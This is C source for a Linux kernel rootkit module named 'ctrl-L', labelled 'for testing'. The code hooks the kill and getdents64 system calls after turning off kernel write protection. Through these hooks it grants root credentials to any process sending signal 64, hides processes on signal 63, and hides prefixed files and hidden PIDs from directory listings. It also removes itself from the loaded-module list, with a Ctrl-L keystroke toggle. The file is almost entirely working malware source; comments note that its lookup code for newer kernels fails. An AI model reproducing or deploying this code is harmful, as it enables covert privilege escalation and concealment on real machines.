#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/string.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/syscalls.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/moduleparam.h>
#include <linux/dirent.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#include "ctrll.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mitchell Clay");
MODULE_DESCRIPTION("Rootkit for testing");

// module parameters that can be set from insmod
// and their defaults here
static int debug = 0;
static bool hideonload = true;
module_param(debug, int, S_IRUGO);
module_param(hideonload, bool, S_IRUGO);

static int hidden = 0;
static int ctrll_count = 0;
static unsigned long cr0;
static unsigned long *sys_call_table;
static t_syscall normal_kill;
static t_syscall normal_getdents64;

// Hide from lsmod and rmmod. Keep pointer to previous module in the list so
// that we know where to jump back in to unhide
void rootkit_hide(void) {
    if (hidden == 0) {
    	module_previous = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        hidden = 1;
    }
}

// Unhide from lsmod and rmmod. This is necessary to unload without rebooting
void rootkit_unhide(void) {
    if (hidden == 1) {
        list_add(&THIS_MODULE->list, module_previous);
        hidden = 0;
    }
}

struct task_struct* lookup_task(pid_t pid) {
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(5, 7, 7)
unsigned long lookup_name(const char *name) {
	struct kprobe kp;
	unsigned long retval;
	int err = 0;

	kp.symbol_name = name;
	err = register_kprobe(&kp);
	if (err < 0) {
		printk(KERN_INFO "ctrl-L couldn't register probe, error: %i\n", err);
		return 0;
	}
	retval = (unsigned long)kp.addr;
	printk(KERN_INFO "ctrl-L put probe at %p", kp.addr);
	unregister_kprobe(&kp);
	return retval;
}
#endif

unsigned long *get_syscall_table(void) {
	unsigned long *syscall_table;
	
	// kallsyms_lookup_name isn't exported anymore after kernel 5.7.7
	#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 7)
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
    #endif

	// Attempt at using kprobe to find syscall table
	// Right now this isn't working. Having issues registering kprobe. 
	// I always get a return value of -2 from register_probe()
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 7)
	unsigned long int i;
	int (*fnct)(unsigned long param);
	fnct = (void *)lookup_name("sys_close");

	for (i = (unsigned long int)ksys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

	if (syscall_table[__NR_close] == fnct) {
			return syscall_table;
		}
	}
	#endif

	return NULL;
}

int kb_cb(struct notifier_block *nblock, unsigned long code, void *_param) {
	struct keyboard_notifier_param *param = _param;

	if (debug > 1) {
		printk(KERN_INFO "code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
			code, param->down, param->shift, param->value);
	}

	// Make sure not to double up on key-up events
	if (!(param->down))
		return NOTIFY_OK;

	// Check for CTRL-L x3
	if (param->value == 0x26 && param->shift == 4) {
		ctrll_count++;
		if (ctrll_count > 2) {
			if (hidden) {
				if (debug) {
					printk(KERN_INFO "Unhiding CTRL-L rootkit\n");
				}
				rootkit_unhide();
			}
			else {
				if (debug) {
					printk(KERN_INFO "Hiding CTRL-L rootkit\n");
				}
				rootkit_hide();
			}
			ctrll_count = 0;
		}
	}
	else {
		// holding down ctrl causes repeats of 29, also had issues here with
		// scancodes in the 60000+ range getting picked up, filter them too
		if (param->value != 29 && param->value < 256) {
			ctrll_count = 0;
		}
	}

	return NOTIFY_OK;
}

void escalate(void) {
	struct cred *rootcreds;
	
	rootcreds = prepare_creds();
	if (rootcreds == NULL)
		return;
	
	rootcreds->uid.val = rootcreds->gid.val = 0;
	rootcreds->euid.val = rootcreds->egid.val = 0;
	rootcreds->suid.val = rootcreds->sgid.val = 0;
	rootcreds->fsuid.val = rootcreds->fsgid.val = 0;
	
	commit_creds(rootcreds);
}

int is_invisible(pid_t pid) {
	struct task_struct *task;
	if (!pid)
		return 0;
	task = lookup_task(pid);
	if (!task)
		return 0;
	if (task->flags & 0x10000000)
		return 1;
	return 0;
}

static asmlinkage long ctrll_getdents64(const struct pt_regs *pt_regs) {
	int fd = (int) pt_regs->di;
    struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;	
	int ret = normal_getdents64(pt_regs), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc &&
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

asmlinkage int ctrll_kill(const struct pt_regs *pt_regs) {
    int sig = (int) pt_regs->si;
    pid_t pid = (pid_t) pt_regs->di;
	struct task_struct *task;

	switch (sig) {
		case 64:
			if (debug) {
				printk(KERN_INFO "ctrl-L: Giving root to PID %d", pid);
			}
			escalate();
			break;
		case 63:
			if ((task = lookup_task(pid)) == NULL)
				return -ESRCH;
			if (debug) {
				printk(KERN_INFO "ctrl-L: Hiding PID %d", pid);
			}
			task->flags ^= 0x10000000;
			break;
		default:
			return normal_kill(pt_regs);
	}
	
	return 0;
}

static inline void change_cr0(unsigned long val) {
	unsigned long __force_order;
    asm volatile("mov %0, %%cr0":"+r"(val), "+m"(__force_order));
}

// Anything here will be perfomed when module is loaded.
// To-do, options and flags (such as silent for no logging)
static int __init ctrll_rootkit_init(void) {
	sys_call_table = get_syscall_table();
	if (!sys_call_table)
		return -1;
	if (debug) {
 	   printk(KERN_INFO "ctrl-L found syscall table at: %p", sys_call_table);
	}

	normal_kill = (t_syscall)sys_call_table[__NR_kill];
	normal_getdents64 = (t_syscall)sys_call_table[__NR_getdents64];


	cr0 = read_cr0();
	change_cr0(cr0 & ~0x00010000);
	sys_call_table[__NR_kill] = (unsigned long) ctrll_kill;
	sys_call_table[__NR_getdents64] = (unsigned long) ctrll_getdents64;
	change_cr0(cr0);
    register_keyboard_notifier(&kb_blk);
    
	if (hideonload) {
		rootkit_hide();
	}
	if (debug) {
 	   printk(KERN_INFO "ctrl-L rootkit loaded\n");
	}
	
    return 0;
}

// Clean up on module unload
static void __exit ctrll_rootkit_exit(void) {
	unregister_keyboard_notifier(&kb_blk);
	if (debug) {
   		printk(KERN_INFO "ctrl-L rootkit unloaded\n");
	}

	change_cr0(cr0 & ~0x00010000);
	sys_call_table[__NR_kill] = (unsigned long) normal_kill;
	sys_call_table[__NR_getdents64] = (unsigned long) normal_getdents64;
	change_cr0(cr0);
}

module_init(ctrll_rootkit_init);
module_exit(ctrll_rootkit_exit);
